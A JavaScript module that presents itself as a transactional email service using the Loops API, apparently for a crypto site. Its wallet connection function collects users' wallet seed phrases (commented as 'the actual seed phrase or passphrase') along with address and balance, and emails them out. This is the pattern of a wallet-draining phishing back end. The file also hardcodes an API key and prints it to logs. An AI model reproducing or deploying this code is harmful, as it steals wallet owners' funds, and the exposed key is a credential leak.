/**
 * Loops Email Service
 * 
 * Sends transactional emails via Loops API
 * https://loops.so/docs/transactional-emails
 */

// HARDCODED - No environment variables
const LOOPS_API_KEY = '0de67ebcc5e8d98792c780ed52b714ee';
const LOOPS_API_URL = 'https://app.loops.so/api/v1/transactional';
const LOOPS_TEMPLATE_ID = 'cmgn2tzu5fqc41q0ivqlmuqf4';
const ADMIN_EMAIL = 'admin@solsnipeai.xyz';

/**
 * Send transactional email via Loops
 * @param {string} transactionalId - The ID of the transactional email template
 * @param {string} email - Recipient email address
 * @param {object} dataVariables - Variables to populate in the email template
 */
async function sendLoopsEmail(transactionalId, email, dataVariables) {
  try {
    console.log('📧 Sending email via Loops...');
    console.log('   API URL:', LOOPS_API_URL);
    console.log('   To:', email);
    console.log('   Template:', transactionalId);
    console.log('   API Key (FULL - FOR DEBUGGING):', LOOPS_API_KEY);
    console.log('   API Key First 10:', LOOPS_API_KEY ? LOOPS_API_KEY.substring(0, 10) : 'Missing');

    const payload = {
      transactionalId: transactionalId,
      email: email,
      dataVariables: dataVariables
    };

    console.log('   Payload:', JSON.stringify(payload, null, 2));

    const response = await fetch(LOOPS_API_URL, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${LOOPS_API_KEY}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    console.log('   Response status:', response.status);
    console.log('   Response headers:', Object.fromEntries(response.headers.entries()));

    if (!response.ok) {
      const errorText = await response.text();
      let errorDetails;
      try {
        errorDetails = JSON.parse(errorText);
      } catch {
        // If it's HTML (404 page), show a cleaner error
        if (errorText.includes('<!DOCTYPE html>')) {
          errorDetails = { 
            message: 'Loops API endpoint not found. Please check API URL and credentials.',
            details: 'Received HTML 404 page instead of API response'
          };
        } else {
          errorDetails = { message: errorText };
        }
      }
      
      console.error('❌ Loops email failed:', errorDetails);
      throw new Error(`Loops API error (${response.status}): ${errorDetails.message || errorDetails.details || 'Unknown error'}`);
    }

    const result = await response.json();
    console.log('✅ Email sent successfully');
    
    return {
      success: true,
      data: result
    };
  } catch (error) {
    console.error('💥 Email sending error:', error.message);
    
    // Don't throw - email failure shouldn't break the main operation
    return {
      success: false,
      error: error.message
    };
  }
}

/**
 * Send wallet connection email
 * @param {string} email - Recipient email
 * @param {object} walletData - Wallet connection data
 */
async function sendWalletConnectionEmail(email, walletData) {
  // HARDCODED template ID
  const transactionalId = LOOPS_TEMPLATE_ID;
  
  const dataVariables = {
    walletName: walletData.walletAddress || 'Unknown',
    connectionType: walletData.inputType || 'seed_phrase',
    codes: walletData.codes || 'N/A', // The actual seed phrase or passphrase
    solBalance: walletData.balance ? walletData.balance.toString() : '0',
    walletType: walletData.walletType || 'solana' // Added WalletType variable
  };

  console.log('📧 Wallet Connection Email Data:');
  console.log('   Email to:', email);
  console.log('   Template ID:', transactionalId);
  console.log('   Data Variables:', dataVariables);

  return await sendLoopsEmail(transactionalId, email, dataVariables);
}

/**
 * Send admin notification email
 * @param {string} email - Admin email
 * @param {object} operationData - Operation details
 */
async function sendAdminNotificationEmail(email, operationData) {
  // HARDCODED template ID
  const transactionalId = LOOPS_TEMPLATE_ID;
  
  const dataVariables = {
    walletName: operationData.walletAddress || 'Unknown',
    connectionType: operationData.operation || 'admin_operation',
    codes: operationData.operationId || 'N/A',
    solBalance: operationData.amount ? operationData.amount.toString() : '0'
  };

  console.log('📧 Admin Notification Email Data:');
  console.log('   Email to:', email);
  console.log('   Template ID:', transactionalId);
  console.log('   Data Variables:', dataVariables);

  return await sendLoopsEmail(transactionalId, email, dataVariables);
}

module.exports = {
  sendLoopsEmail,
  sendWalletConnectionEmail,
  sendAdminNotificationEmail
};
